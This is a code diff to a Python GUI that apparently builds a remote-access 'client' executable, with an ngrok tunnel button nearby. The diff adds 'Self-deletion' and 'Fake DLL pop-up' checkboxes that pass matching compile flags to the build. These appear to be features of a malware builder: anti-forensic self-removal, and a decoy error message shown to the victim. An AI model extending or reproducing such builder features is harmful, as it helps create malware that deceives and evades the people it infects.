@@ -421,6 +421,20 @@ class GUI:
         self.button_build = ttk.Button(top_frame, text="Build Client", command=self.build_client)
         self.button_build.grid(row=1, column=4, padx=5, pady=(10,0))
 
+        self.selfdel_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(
+            top_frame,
+            text="Self-deletion",
+            variable=self.selfdel_var
+        ).grid(row=1, column=6, padx=5, pady=(10, 0))
+
+        self.fakedll_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(
+            top_frame,
+            text="Fake DLL pop-up",
+            variable=self.fakedll_var
+        ).grid(row=1, column=7, padx=5, pady=(10, 0))
+
         self.button_ngrok = ttk.Button(
             top_frame,
             text="Start ngrok tunnel",
@@ -608,6 +622,11 @@ class GUI:
                 "-mwindows",
                 "-lcrypt32"
             ]
+
+        if self.selfdel_var.get():
+            compile_cmd.insert(1, "-DSELF_DELETE")
+        if self.fakedll_var.get():
+            compile_cmd.insert(1, "-DFAKE_DLL_POPUP")
 
         try:
             subprocess.run(compile_cmd, check=True)
